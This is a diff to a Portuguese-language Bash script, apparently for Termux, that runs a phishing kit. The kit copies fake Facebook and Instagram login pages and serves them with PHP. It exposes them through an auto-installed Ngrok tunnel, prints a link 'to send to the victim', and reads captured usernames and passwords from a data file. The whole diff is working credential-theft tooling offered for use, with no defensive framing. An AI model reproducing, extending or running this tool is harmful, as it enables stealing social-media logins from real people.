@@ -27,14 +27,16 @@
 # 
 # v0.1 2022-11-28, Oliver Silva;
 #     Adicionado suporte para facebook e instagram
-# v0.w 2023-01-05, Oliver Silva:
+# v0.2 2023-01-05, Oliver Silva:
 #     Adicionado o comando JQ no lugar do GREP
+# v0.3 2023-01-07, Oliver Silva:
+#     Adicionado instalador Ngrok
 #
 # Licença: MIT License
 #
 # Versão 0.1: Gera páginas somente facebook e instagram
 # Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
-#
+# Versão 0.3: Instalador Ngrok
 #
 
 
@@ -55,13 +57,10 @@ verifyProot() {
 }
 
 verifyLinks() {
-
     if [ "$1" == "null" -a "$2" == "null" ] ; then
-	echo "[!] Links nulos, Execute este programa novamente!"
-        interrupt
+	echo -e "\e[31;1m[!] Links Ngrok nulos, execute este programa em outro tipo de shell proot ou execute este programa novamente\e[0m"
     fi
 }
-
 
 interrupt() {
     echo -e "\nPrograma interrompido!\n"
@@ -71,16 +70,30 @@ interrupt() {
 }
 
 listen() {
+
+    if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
+	functionGroup
+
+    else
+	functionGroup
+
+    fi
+}
+
+functionGroup() {
     verifyProot
     removeFiles
     copyFiles
     processKill
-
-    php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
-    sleep 3
+    listenLocalhost
     banner
     echo -e "\e[32m[+] Dados para enviar a vítima:\e[0m"
     showLink
+}
+
+listenLocalhost() {
+    php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
+    sleep 3
 }
 
 removeFiles() {
@@ -100,7 +113,9 @@ copyFiles() {
 }
 
 tunnel() {
+
     if [ "$tunnel" == "ngrok" ] ; then
+	installNgrokIfNotExists
         verifyProot
         ngrok http $port --log=stdout > /dev/null 2>&1 &
         sleep 3
@@ -111,6 +126,7 @@ tunnel() {
 	exit 1
     fi
 }
+
 
 processKill() {
     [ $(ps -e | grep -Eo "php") ] && pkill php
@@ -131,8 +147,8 @@ showLinkNgrok() {
  
     verifyLinks $addr $public
 
-    echo -e "\e[32m[+] Ngrok addr: \e[33;1m$addr\e[0m"
-    echo -e "\e[32m[+] Ngrok public: \e[33;1m$public\e[0m"
+    echo -e "\e[32m[+] Ngrok localhost: \e[33;1m$addr\e[0m"
+    echo -e "\e[32m[+] Ngrok URL: \e[33;1m$public\e[0m"
 
 }
 getDataCaptured() {
@@ -166,8 +182,8 @@ get_data() {
 	usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
 	senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
 
-	echo -e "\e[32m[-] Usuário: \e[31;1m$usuario\e[0m"
-	echo -e "\e[32m[-] Senha: \e[31;1m$senha\e[0m"
+	echo -e "\e[32m[-] Usuário: \e[34;1m$usuario\e[0m"
+	echo -e "\e[32m[-] Senha: \e[34;1m$senha\e[0m"
 
     else
 	printf "\r\e[32m[*] Aguardando credenciais...\e[0m"
@@ -178,8 +194,8 @@ get_data() {
 banner() {
 echo -e "\e[34m
 	        '  
-              '   '  TIOOLIVER | t.me/tiooliver
-            '       '   youtube.com/tiooliver - BRAZIL
+              '   '  TIOOLIVER | t.me/tiooliver_sh
+            '       '   youtube.com/@tioolive - BRAZIL
         . ' .    '    '                       '
      ' 		    '	                   '   '
   █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
@@ -211,6 +227,27 @@ list() {
 	echo "√ $service"
     done
     exit 0
+}
+
+installNgrokIfNotExists() {
+    arch=$(dpkg --print-architecture)
+
+    if [ ! -f $PREFIX/bin/ngrok ] ; then
+	printf "\r\e[33;1m[*] Instalando Ngrok...\e[0m"
+	
+	curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz > /dev/null 2>&1 &
+	
+	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
+	    printf "\r\e[33;1m[*] Instalando Ngrok..."
+	done
+	printf "\r\e[33;1m[+] Instalando Ngrok...\e[32;1mOK\e[0m\n"
+	while [ ! -f $PREFIX/bin/ngrok ] ; do
+	    printf "\r\e[33;1m[*] Extraindo Ngrok...\e[0m"
+	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $PREFIX/bin > /dev/null
+        done
+	printf "\r\e[33;1m[+] Extraindo Ngrok...\e[32;1mOK\e[0m\n"
+	rm ngrok-v3-stable-linux-${arch}.tgz
+    fi
 }
 
 if [ -z "$1" ] ; then
